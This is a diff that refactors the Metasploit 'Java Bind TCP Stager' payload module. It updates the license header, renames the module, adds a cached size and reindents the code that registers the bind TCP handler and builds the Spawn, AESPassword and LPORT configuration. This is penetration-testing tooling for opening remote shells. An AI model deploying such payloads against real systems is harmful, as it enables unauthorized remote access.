@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -10,53 +8,55 @@ require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
-module Metasploit3
+module MetasploitModule
 
-	include Msf::Payload::Stager
-	include Msf::Payload::Java
+  CachedSize = 5105
 
-	def initialize(info = {})
-		super(merge_info(info,
-			'Name'          => 'Java Bind TCP Stager',
-			'Description'   => 'Listen for a connection',
-			'Author'        => [
-					'mihi',  # all the hard work
-					'egypt', # msf integration
-				],
-			'License'       => MSF_LICENSE,
-			'Platform'      => 'java',
-			'Arch'          => ARCH_JAVA,
-			'Handler'       => Msf::Handler::BindTcp,
-			'Convention'    => 'javasocket',
-			'Stager'        => {'Payload' => ""}
-			))
+  include Msf::Payload::Stager
+  include Msf::Payload::Java
 
-		register_advanced_options(
-			[
-				Msf::OptString.new('AESPassword', [ false, "Password for encrypting communication", '' ]),
-				Msf::OptInt.new('Spawn', [ true, "Number of subprocesses to spawn", 2 ])
-			], self.class
-		)
+  def initialize(info = {})
+    super(merge_info(info,
+      'Name'          => 'Java Bind TCP Stager',
+      'Description'   => 'Listen for a connection',
+      'Author'        => [
+          'mihi',  # all the hard work
+          'egypt', # msf integration
+        ],
+      'License'       => MSF_LICENSE,
+      'Platform'      => 'java',
+      'Arch'          => ARCH_JAVA,
+      'Handler'       => Msf::Handler::BindTcp,
+      'Convention'    => 'javasocket',
+      'Stager'        => {'Payload' => ""}
+      ))
 
-		@class_files = [ ]
-	end
+    register_advanced_options(
+      [
+        Msf::OptString.new('AESPassword', [ false, "Password for encrypting communication", '' ]),
+        Msf::OptInt.new('Spawn', [ true, "Number of subprocesses to spawn", 2 ])
+      ], self.class
+    )
 
-	def config
-		spawn = datastore["Spawn"] || 2
-		c =  ""
-		c << "Spawn=#{spawn}\n"
-		pass = datastore["AESPassword"] || ""
-		if pass != ""
-			c << "AESPassword=#{pass}\n"
-			@class_files = [
-				[ "metasploit", "AESEncryption.class" ],
-			]
-		else
-			@class_files = [ ]
-		end
-		c << "LPORT=#{datastore["LPORT"]}\n" if datastore["LPORT"]
+    @class_files = [ ]
+  end
 
-		c
-	end
+  def config
+    spawn = datastore["Spawn"] || 2
+    c =  ""
+    c << "Spawn=#{spawn}\n"
+    pass = datastore["AESPassword"] || ""
+    if pass != ""
+      c << "AESPassword=#{pass}\n"
+      @class_files = [
+        [ "metasploit", "AESEncryption.class" ],
+      ]
+    else
+      @class_files = [ ]
+    end
+    c << "LPORT=#{datastore["LPORT"]}\n" if datastore["LPORT"]
+
+    c
+  end
 
 end
